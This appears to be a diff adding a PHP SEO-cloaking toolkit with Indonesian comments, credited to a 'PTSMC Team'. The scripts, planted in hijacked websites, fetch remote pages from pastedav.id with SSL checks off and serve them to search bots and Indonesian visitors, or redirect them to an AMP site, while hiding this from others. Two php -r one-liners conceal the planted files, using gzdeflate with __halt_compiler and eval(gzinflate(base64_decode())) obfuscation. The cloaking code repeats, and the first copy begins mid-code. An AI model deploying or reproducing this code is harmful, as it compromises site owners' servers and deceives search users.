+      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+
+    ]);
+
+    $response = curl_exec($ch_ip);
+
+    curl_close($ch_ip);
+
+  }
+
+
+
+  $data = json_decode($response, true);
+
+  // Jika data valid dan dari Indonesia
+
+  if ($data && isset($data['countryCode']) && $data['countryCode'] === 'ID') {
+
+    $isIndo = true;
+
+  }
+
+}
+
+// --- FUNGSI IP SELESAI ---
+
+
+
+
+
+// Jika bot ATAU pengunjung dari Indonesia (ID), ambil konten dan eksekusi fungsi tambahan
+
+if ($isBot || $isIndo) {
+
+   
+
+  // --- FUNGSI ANTI-CACHE & SEO BOOST ---
+
+  // Memaksa browser dan proxy untuk tidak menyimpan cache halaman ini
+
+  header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+
+  header("Cache-Control: post-check=0, pre-check=0", false);
+
+  header("Pragma: no-cache");
+
+  header("Expires: Wed, 11 Jan 1984 05:00:00 GMT"); // Tanggal kadaluarsa di masa lalu
+
+
+
+  // Sinyal kuat untuk Googlebot agar langsung index, follow, dan memberikan porsi snippet maksimal
+
+  header("X-Robots-Tag: index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1");
+
+   
+
+  // Memastikan Google membaca dokumen ini secara absolut sebagai HTML yang valid
+
+  header("Content-Type: text/html; charset=UTF-8");
+
+  // -------------------------------------
+
+
+
+  $ch = curl_init();
+
+  curl_setopt($ch, CURLOPT_URL, $matchedMap['ptsmc']);
+
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+  curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+  curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+
+  curl_setopt($ch, CURLOPT_USERAGENT, $ua); // Meneruskan User-Agent bot/pengunjung
+
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // sslverify => false
+
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+
+
+  $response_body = curl_exec($ch);
+
+  $curl_error = curl_error($ch);
+
+  curl_close($ch);
+
+
+
+  // Jika eksekusi cURL berhasil tanpa error, tampilkan body dan hentikan script
+
+  if (empty($curl_error) && $response_body !== false) {
+
+    echo $response_body;
+
+    exit;
+
+  }
+
+}
+
+
+
+// Jika bukan bot dan bukan IP Indo, script lanjut (nampilin halaman folder asli)
+
+return;
+
+
+
+?>
+
+
+
+================================================================================================================================================================
+
+
+
+
+
+HALT COMPILER
+
+
+
+php -r '$f="CveLiblary.php";if(file_exists($f)){$c=file_get_contents($f);copy($f,$f.".bak");$s="<?php /*".chr(0)."*/eval(\"?>\".gzinflate(stream_get_contents(fopen(FILE,\"rb\"),-1,COMPILER_HALT_OFFSET)));__halt_compiler();";file_put_contents($f,$s.gzdeflate($c,9));echo "\n[✔️] SUCCESS: File $f di-backup ke .bak & di-overwrite menjadi Blank Editor (Compiler Halt Offset)!\n\n";}else{echo "\n[X] ERROR: File $f tidak ditemukan!\n\n";}'
+
+
+
+
+
+================================================================================================================================================================
+
+
+
+
+
+script mutasi
+
+
+
+php -r '$f="ptsmc.php"; if(!file_exists($f)) die("Error: File ptsmc.php tidak ditemukan!\n"); $c=file_get_contents($f); $c=preg_replace("/^\s*<\?php\s*/i", "", $c); $p=base64_encode(gzdeflate($c)); file_put_contents("demo.php", "<?php eval(gzinflate(base64_decode(\"$p\"))); ?>"); echo "Mutasi Berhasil! File demo.php siap dieksekusi.\n";'v
+
+
+
+
+
+================================================================================================================================================================
+
+
+
+
+
+
+
+Cloaking The Next Level
+
+
+
+<?php
+
+
+
+  // --- Builded By PTSMC Team ---
+
+  // Cloaking VVIP Khusus Patch Baru google & SEO Booster
+
+$uriMappings = [
+
+  'about' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+  'auth/regist' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+  // Contoh penambahan multi-level folder:
+
+  'category/shoes/adidas' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+  // FITUR: Dukungan untuk Query String / Parameter ID
+
+  '?id=2421' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+  'id=2422' => [ 
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+  // FITUR BARU: Dukungan untuk Ekstensi File Spesifik (.php / .html)
+
+  'contact.php' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ],
+
+  'contact.html' => [
+
+    'ptsmc' => 'https://pastedav.id/d/content'
+
+  ]
+
+];
+
+
+
+$matchedMap = null;
+
+
+
+// Deteksi URI yang akurat (Support Multi-level Folder, Query String, Ekstensi File & Mencegah False Positives)
+
+if (isset($_SERVER['REQUEST_URI'])) {
+
+  $requestUri = $_SERVER['REQUEST_URI'];
+
+   
+
+  // Pecah URI menjadi Path dan Query
+
+  $requestPath = parse_url($requestUri, PHP_URL_PATH);
+
+  $requestPathNormalized = trim($requestPath, '/');
+
+  $requestQuery = parse_url($requestUri, PHP_URL_QUERY); // Menangkap parameter setelah tanda '?'
+
+
+
+  foreach ($uriMappings as $pattern => $map) {
+
+    // Cek apakah pattern yang ditulis di array adalah Query String (mengandung '=' atau '?')
+
+    if (strpos($pattern, '=') !== false || strpos($pattern, '?') !== false) {
+
+      $patternQuery = ltrim($pattern, '?');
+
+      // Pencocokan parameter query secara presisi
+
+      if ($requestQuery !== null && strpos($requestQuery, $patternQuery) !== false) {
+
+        $matchedMap = $map;
+
+        break;
+
+      }
+
+    } else {
+
+      // Logika existing untuk pencocokan segmen folder dan ekstensi file secara absolut
+
+      $patternNormalized = trim($pattern, '/');
+
+      $escapedPattern = preg_quote($patternNormalized, '/');
+
+       
+
+      if (preg_match("/(^|\/)" . $escapedPattern . "(\/|$)/i", $requestPathNormalized)) {
+
+        $matchedMap = $map;
+
+        break;
+
+      }
+
+    }
+
+  }
+
+}
+
+
+
+// Jika tidak ada URI yang cocok, lanjutkan eksekusi normal
+
+if (!$matchedMap) {
+
+  return;
+
+}
+
+
+
+$bots = [
+
+  'Googlebot','Bingbot','Slurp','DuckDuckBot','Baiduspider',
+
+  'YandexBot','Sogou','TelegramBot','Exabot','facebot',
+
+  'ia_archiver','Google-Site-Verification','Google-InspectionTool','AhrefsBot'
+
+];
+
+
+
+$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+
+
+// Deteksi apakah User-Agent adalah bot
+
+$isBot = !empty(array_filter($bots, function($botName) use ($ua) {
+
+  return stripos($ua, $botName) !== false;
+
+}));
+
+
+
+// --- FUNGSI IP DIMULAI DARI SINI ---
+
+function getUserIP() {
+
+  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
+
+    $ip = $_SERVER['HTTP_CLIENT_IP'];
+
+  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
+
+    $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
+
+  } else {
+
+    $ip = $_SERVER['REMOTE_ADDR'];
+
+  }
+
+  return $ip;
+
+}
+
+
+
+$isIndo = false;
+
+
+
+// Cek IP dari API HANYA jika yang datang bukan bot
+
+if (!$isBot) {
+
+  $ip = getUserIP();
+
+  $api_url = "http://ip-api.com/json/{$ip}";
+
+
+
+  $context = stream_context_create([
+
+    'http' => [
+
+      'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36\r\n"
+
+    ]
+
+  ]);
+
+
+
+  $response = @file_get_contents($api_url, false, $context);
+
+  if ($response === FALSE) {
+
+    $ch_ip = curl_init();
+
+    curl_setopt($ch_ip, CURLOPT_URL, $api_url);
+
+    curl_setopt($ch_ip, CURLOPT_RETURNTRANSFER, 1);
+
+    curl_setopt($ch_ip, CURLOPT_HTTPHEADER, [
+
+      "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"
+
+    ]);
+
+    $response = curl_exec($ch_ip);
+
+    curl_close($ch_ip);
+
+  }
+
+
+
+  $data = json_decode($response, true);
+
+  // Jika data valid dan dari Indonesia
+
+  if ($data && isset($data['countryCode']) && $data['countryCode'] === 'ID') {
+
+    $isIndo = true;
+
+  }
+
+}
+
+// --- FUNGSI IP SELESAI ---
+
+
+
+
+
+// Jika bot ATAU pengunjung dari Indonesia (ID), ambil konten dan eksekusi fungsi tambahan
+
+if ($isBot || $isIndo) {
+
+   
+
+  // --- FUNGSI ANTI-CACHE & SEO BOOST ---
+
+  // Memaksa browser dan proxy untuk tidak menyimpan cache halaman ini
+
+  header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
+
+  header("Cache-Control: post-check=0, pre-check=0", false);
+
+  header("Pragma: no-cache");
+
+  header("Expires: Wed, 11 Jan 1984 05:00:00 GMT"); // Tanggal kadaluarsa di masa lalu
+
+
+
+  // Sinyal kuat untuk Googlebot agar langsung index, follow, dan memberikan porsi snippet maksimal
+
+  header("X-Robots-Tag: index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1");
+
+   
+
+  // Memastikan Google membaca dokumen ini secara absolut sebagai HTML yang valid
+
+  header("Content-Type: text/html; charset=UTF-8");
+
+  // -------------------------------------
+
+
+
+  $ch = curl_init();
+
+  curl_setopt($ch, CURLOPT_URL, $matchedMap['ptsmc']);
+
+  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+  curl_setopt($ch, CURLOPT_TIMEOUT, 20);
+
+  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+  curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
+
+  curl_setopt($ch, CURLOPT_USERAGENT, $ua); // Meneruskan User-Agent bot/pengunjung
+
+  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // sslverify => false
+
+  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+
+
+
+  $response_body = curl_exec($ch);
+
+  $curl_error = curl_error($ch);
+
+  curl_close($ch);
+
+
+
+  // Jika eksekusi cURL berhasil tanpa error, tampilkan body dan hentikan script
+
+  if (empty($curl_error) && $response_body !== false) {
+
+    echo $response_body;
+
+    exit;
+
+  }
+
+}
+
+
+
+// Jika bukan bot dan bukan IP Indo, script lanjut (nampilin halaman folder asli)
+
+return;
+
+
+
+?>
+
+
+
+
+
+
+
+<?php
+
+
+
+function mangsud($url) {
+
+  if (ini_get('allow_url_fopen')) {
+
+    return @file_get_contents($url);
+
+  } elseif (function_exists('curl_init')) {
+
+    $ch = curl_init();
+
+    curl_setopt($ch, CURLOPT_URL, $url);
+
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+
+    $res = curl_exec($ch);
+
+    curl_close($ch);
+
+    return $res;
+
+  }
+
+  return false;
+
+}
+
+
+
+$ua = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
+
+$uri = $_SERVER['REQUEST_URI'] ?? '/';
+
+$uri_path = parse_url($uri, PHP_URL_PATH);
+
+
+
+$bot_regex = "/(googlebot|google|adsbot|mediapartners|bingbot|slurp|yandex|duckduck|baidu|ahrefs|semrush|mj12|dotbot|crawler|spider|facebook|twitterbot|telegrambot)/i";
+
+
+
+// Konfigurasi untuk berbagai path
+
+$configs = [
+
+  '/private-events' => [
+
+    'amp' => 'https://amp-westlakefishehouse.pages.dev/',
+
+    'lp' => 'https://pastedav.id/d/qSXwy9kB'
+
+  ],
+
+  
+
+];
+
+
+
+// Normalisasi path (hapus trailing slash untuk perbandingan)
+
+$uri_path_normalized = rtrim($uri_path, '/');
+
+if ($uri_path_normalized === '') {
+
+  $uri_path_normalized = '/';
+
+}
+
+
+
+// DEBUG: Tambahkan logging untuk debugging
+
+error_log("URI: $uri");
+
+error_log("URI Path: $uri_path");
+
+error_log("URI Normalized: $uri_path_normalized");
+
+error_log("User Agent: $ua");
+
+
+
+// Cek apakah URI cocok dengan salah satu path yang dikonfigurasi
+
+$matched = false;
+
+foreach ($configs as $path => $config) {
+
+  $path_normalized = rtrim($path, '/');
+
+  if ($path_normalized === '') {
+
+    $path_normalized = '/';
+
+  }
+
+   
+
+  error_log("Checking path: $path_normalized vs $uri_path_normalized");
+
+   
+
+  // Match path (dengan atau tanpa trailing slash)
+
+  if ($uri_path_normalized === $path_normalized) {
+
+    $matched = true;
+
+     
+
+    $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+
+    error_log("IP Address: $ip");
+
+     
+
+    // Redirect IP Indonesia ke AMP
+
+    if (!empty($ip)) {
+
+      $geo = @json_decode(@file_get_contents("http://ip-api.com/json/$ip"), true);
+
+      error_log("Country Code: " . ($geo['countryCode'] ?? 'Unknown'));
+
+       
+
+      if (!empty($geo['countryCode']) && $geo['countryCode'] === "ID") {
+
+        error_log("Redirecting Indonesian IP to AMP");
+
+        header("Location: " . $config['amp']);
+
+        exit;
+
+      }
+
+    }
+
+     
+
+    // Tampilkan LP untuk bot
+
+    if (preg_match($bot_regex, $ua)) {
+
+      error_log("Bot detected, showing LP");
+
+      $f = mangsud($config['lp']);
+
+      if ($f) {
+
+        echo $f;
+
+      } else {
+
+        // Fallback jika tidak bisa fetch
+
+        echo "<script>window.location.href = '" . $config['lp'] . "';</script>";
+
+      }
+
+      exit;
+
+    }
+
+     
+
+    // Untuk non-bot, non-ID, lanjut ke konten asli
+
+    error_log("Non-bot, non-ID traffic, continuing to main site");
+
+    break;
+
+  }
+
+}
+
+
+
+// Jika tidak match dengan config cloaking, lanjut ke website normal
+
+if (!$matched) {
+
+  error_log("No path matched for cloaking, continuing to main site");
+
+}
+
+
+
+?>
